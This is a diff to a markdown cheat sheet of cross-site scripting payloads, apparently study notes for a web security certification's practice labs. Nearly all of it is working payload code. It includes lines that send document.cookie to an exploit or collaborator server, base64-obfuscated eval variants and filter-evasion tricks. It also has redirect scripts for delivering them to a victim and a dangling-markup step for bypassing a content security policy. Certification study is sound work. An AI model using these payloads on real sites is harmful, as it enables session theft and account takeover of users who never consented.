@@ -124,6 +124,61 @@ location='URL'
 </script>
 ```
 
+## Practice exams payloads
+#### App 1
+```
+\\"-alert('XSS')}//
+\\"-eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))}//
+```
+For SearchTerm: base64 for atob string --> urlencode for full value of SearchTerm, i.e:
+```
+<@urlencode>\\"-eval(atob("<@base64>document.
+location='https://exploit-...exploit-server.net/random?c='+document.cookie</@base64>"))}//'</@urlencode>"
+```
+```html
+<script>
+window.location.replace("https://...web-security-academy.net/?SearchTerm=\\"-eval(atob("document.
+location='https://exploit-...exploit-server.net/random?c='+document.cookie"))}//'");
+</script>
+```
+
+#### App2
+```
+alert`1`
+\\"-alert`1`}//
+"-eval`${document.location="https://exploit-...exploit-server.net/random?c="+document.cookie}`-"
+```
+```html
+<script>
+document.location="https://...web-security-academy.net/?find="-eval`${document.
+location='https://exploit-...exploit-server.net/random?c='+document.cookie}`-""
+</script> - but "" will ruin everything, so encode second part inside find=
+```
+#### wr3dmast3r
+Some payloads from wr3dmast3r article about [BSCP certification](https://habr.com/en/companies/jetinfosystems/articles/805297/).
+```html
+"-prompt(1)-"
+"-alert(1)-"
+"-alert(window["document"]["cookie"])-" 
+"-window["alert"](window["document"]["cookie"])-" 
+"-self["alert"](self["document"]["cookie"])-"
+fetch(`https://COLLAB/?xss=` + window["document"]["cookie"]) // send to your server
+"-eval(atob("fetch(`https://collaborator/?xss=` + window["document"]["cookie"])"))-" // base64 encode
+"-eval(atob("ZmV0Y2goYGh0dHBzOi8vY29sbGFib3JhdG9yLz94c3M9YCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p"))-"
+<script>
+document.location = "https://...web-security-academy.net/?SearchTerm=%22-eval%28atob%28%22fetch
+(`https://collaborator/?xss=`+window["document"]["cookie"])%22%29%29-%22"
+</script> // don't forget to encode in base64
+
+\\"-alert`1`}//
+\\"-prompt`${document.cookie}`}// - might not work
+\\"-setTimeout`alert\x28document.cookie\x29`}//
+\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//
+<script>
+document.location="https://...web-security-academy.net/?find=\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//"
+</script> // don't forget to URL-encode value in find param
+```
+
 ## LAB payloads
 ```html
 <script>alert(1)</script>
@@ -263,57 +318,17 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+o
 ```
 %27accesskey=%27x%27onclick=%27alert(1)%27x=%27
 ```
-## Practice exams payloads
-#### App 1
+
+**bypass strict CSP via dangling markup**
+- find that if you pass email param inside url it will be reflected (also you can scan it and scanner will find 
+  reflected xss)
 ```
-\\"-alert('XSS')}//
-\\"-eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))}//
+https://...web-security-academy.net/my-account?email=AUBFSI
 ```
-For SearchTerm: base64 for atob string --> urlencode for full value of SearchTerm, i.e:
-```
-<@urlencode>\\"-eval(atob("<@base64>document.
-location='https://exploit-...exploit-server.net/random?c='+document.cookie</@base64>"))}//'</@urlencode>"
-```
+- use it as a point to dangling markup injection: add value for email, create button, dangle everything after
+- add this payload to exploit and send to victim
 ```html
 <script>
-window.location.replace("https://...web-security-academy.net/?SearchTerm=\\"-eval(atob("document.
-location='https://exploit-...exploit-server.net/random?c='+document.cookie"))}//'");
+window.location="https://...web-security-academy.net/my-account?email=hacker@evil-user.net"><button type="submit">Click me</button><img src=""
 </script>
-```
-
-#### App2
-```
-alert`1`
-\\"-alert`1`}//
-"-eval`${document.location="https://exploit-...exploit-server.net/random?c="+document.cookie}`-"
-```
-```html
-<script>
-document.location="https://...web-security-academy.net/?find="-eval`${document.
-location='https://exploit-...exploit-server.net/random?c='+document.cookie}`-""
-</script> - but "" will ruin everything, so encode second part inside find=
-```
-#### wr3dmast3r
-Some payloads from wr3dmast3r article about [BSCP certification](https://habr.com/en/companies/jetinfosystems/articles/805297/).
-```html
-"-prompt(1)-"
-"-alert(1)-"
-"-alert(window["document"]["cookie"])-" 
-"-window["alert"](window["document"]["cookie"])-" 
-"-self["alert"](self["document"]["cookie"])-"
-fetch(`https://COLLAB/?xss=` + window["document"]["cookie"]) // send to your server
-"-eval(atob("fetch(`https://collaborator/?xss=` + window["document"]["cookie"])"))-" // base64 encode
-"-eval(atob("ZmV0Y2goYGh0dHBzOi8vY29sbGFib3JhdG9yLz94c3M9YCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p"))-"
-<script>
-document.location = "https://...web-security-academy.net/?SearchTerm=%22-eval%28atob%28%22fetch
-(`https://collaborator/?xss=`+window["document"]["cookie"])%22%29%29-%22"
-</script> // don't forget to encode in base64
-
-\\"-alert`1`}//
-\\"-prompt`${document.cookie}`}// - might not work
-\\"-setTimeout`alert\x28document.cookie\x29`}//
-\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//
-<script>
-document.location="https://...web-security-academy.net/?find=\\"-setTimeout`fetch\x28'https://collaborator/jsonc='+document.cookie\x29`}//"
-</script> // don't forget to URL-encode value in find param
 ```
